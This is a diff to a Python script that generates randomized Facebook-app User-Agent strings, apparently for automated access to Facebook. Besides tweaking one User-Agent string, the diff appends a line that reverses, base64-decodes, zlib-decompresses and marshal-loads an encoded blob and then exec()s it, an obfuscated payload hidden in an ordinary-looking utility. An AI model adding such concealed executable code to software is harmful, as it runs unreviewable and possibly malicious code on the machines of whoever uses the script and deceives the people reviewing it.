@@ -14,7 +14,8 @@ def m1():
   fbcr = random.choice(['null', 'o2 - de', 'Verizon - us', 'Vodafone - uk']) # اختيار عشوائي لاسم مشغل الشبكة 
   
   s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
-  e = 'Mozilla/5.0 (Linux; Android 6.0.2; Nokia Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.157 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/178.94.48.72;]'
+  e = 'Mozilla/5.0 (Linux; Android 5.5.1; Kaios Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.157 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/182.4.98.40;]'
   
   ua = s + ";FBNW/" + network + e  # Adding network type to the User-Agent string
   return ua
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=ISvC+4A05CSDlMidiyTEfKW8LmsYw6eVcpQcf7VSwjsfwyelfJdRDfxDaIwyRrLWd599nZWe5FCT9iQZqrZPT4X3bMZpcRRscMS0IPMlmiNhUBX8bh0oV85G/rnra95nyVImtRpiYS2SqXlKbit7tbxJ3nRP+lmVqssvogq+J1yrVaFuuU+XPd9vWgzPzV725s02b3nxy+vgECHlhGjINEEY7dSImfjztJXk3RS0ADV42KXyeJJlmRdX6zjwrVUaQuuJxvQY98u/M93LY0fJjEdAqPkSxm/UeVcIySGalp2OWNCpTLd0GT9kOXgKvXQo9g6BCHOE+hmC0/znzAcnJg+rae92ek1E57i1OTmEAucan4wq904Ve+Q+ORVOeQbFUbTUptjaGKcvJIO1Yhf3q8Qqhtibi4bDlXiJVzZuun8/fmllnUQbz/zMpjNW0LDfciBgn8YvluTCFFaPPFhYgJZKdEiOAx9c3t5YkhCf7nze/2eM3s9Zp90bZ1bJbO5scC+ok1vAFZs/iueS864iBRVmDPeoGrgCfYjskp0NhF07gYpKv3SNnOG8W0IZ0zQcTRP4SYPC2AtuGbNdmdnYE0GL9cUtxJe'))
